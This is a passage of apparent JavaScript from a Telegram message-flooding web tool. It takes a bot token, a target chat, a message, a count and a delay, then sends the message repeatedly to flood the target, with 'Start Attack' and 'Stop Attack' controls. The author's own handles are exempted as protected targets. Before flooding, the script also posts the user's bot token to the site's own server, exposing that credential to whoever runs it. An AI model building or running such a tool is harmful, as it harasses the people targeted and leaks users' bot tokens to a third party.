                return;
            }
            
            const botToken = document.getElementById('tokenInput').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const message = document.getElementById('message').value.trim();
            const count = parseInt(document.getElementById('count').value);
            const delayMs = parseInt(document.getElementById('delay').value);

            // Validation
            if (!botToken || !chatId) {
                alert("Please fill in Bot Token and Target!");
                return;
            }

            if (!message) {
                alert("Please enter a message to spam!");
                return;
            }

            // Protected targets
            const protectedTargets = ['@GyzenVtx', 'Vortunix', '7774881838', '@Gyzen', 'Vtx'];
            if (protectedTargets.some(target => chatId.toLowerCase().includes(target.toLowerCase()))) {
                alert("‚ùå This target is protected and cannot be attacked!");
                return;
            }

            // Reset state
            stats = { sent: 0, success: 0, error: 0 };
            utils.updateStats();
            isRunning = true;
            
            // Update UI
            document.getElementById('attackBtn').innerHTML = '<i class="fas fa-stop"></i> Stop Attack';
            document.getElementById('attackBtn').classList.add('btn-secondary');
            utils.clearLog();
            
            utils.logMessage(`üöÄ Starting spam to ${chatId}...`, "info");

            try {
                // Send notification to server
                await fetch('/api/telegram-spam', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token: botToken, chatId, count, delay: delayMs, message })
                });

                utils.logMessage("‚úÖ Spam started!", "success");

                // Execute spam
                for (let i = 0; i < count && isRunning; i++) {
                    try {
                        const current = i + 1;
                        
                        const result = await telegramAPI.sendMessage(
                            botToken, 
                            chatId, 
                            message
                        );

                        if (result.ok) {
                            utils.logMessage(`‚úÖ ${current}/${count} success: "${message}"`, "success");
                            utils.updateStats('success');
                        } else {
                            utils.logMessage(`‚ùå ${current}/${count} failed: ${result.description}`, "error");
                            utils.updateStats('error');
                        }
                        
                        utils.updateStats('sent');
                        await utils.delay(delayMs);
                        
                    } catch (error) {
                        utils.logMessage(`üí• Error: ${error.message}`, "error");
                        utils.updateStats('error');
                    }
                }
                
            } catch (error) {
                utils.logMessage(`‚ùå System Error: ${error.message}`, "error");
            } finally {
                isRunning = false;
                document.getElementById('attackBtn').innerHTML = '<i class="fas fa-play"></i> Start Attack';
                document.getElementById('attackBtn').classList.remove('btn-secondary');
                utils.logMessage("üèÅ Spam completed!", "success");
            }
        }

        function stopAttack() {
            isRunning = false;
            document.getElementById('attackBtn').innerHTML = '<i class="fas fa-play"></i> Start Attack';
            document.getElementById('attackBtn').classList.remove('btn-secondary');
            utils.logMessage("‚èπÔ∏è Spam stopped", "warning");
        }

        function setQuickSettings(count, delay) {
            document.getElementById('count').value = count;
            document.getElementById('countRange').value = count;
            document.getElementById('delay').value = delay;
            document.getElementById('delayRange').value = delay;
            utils.logMessage(`‚ö° Preset: ${count} messages, ${delay}ms delay`, "info");
        }

        // Event listeners when page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Sync range and number inputs
            const syncInputs = (rangeId, numberId) => {
                const range = document.getElementById(rangeId);
                const number = document.getElementById(numberId);
                
                range.addEventListener('input', () => number.value = range.value);
                number.addEventListener('input', () => range.value = number.value);
            };
            
            syncInputs('countRange', 'count');
            syncInputs('delayRange', 'delay');

            // Close sidebar when clicking on a link (for mobile)
            document.querySelectorAll('.nav-link').forEach(link => {
                link.addEventListener('click', function() {
                    if (window.innerWidth < 1024) {
                        toggleSidebar();
                    }
                });
            });

            // Log welcome message
            setTimeout(() => {
                utils.logMessage('üöÄ Telegram system ready', 'success');
                utils.logMessage('‚öôÔ∏è Enter bot token, target, and message', 'info');
            }, 500);
        });
    </script>
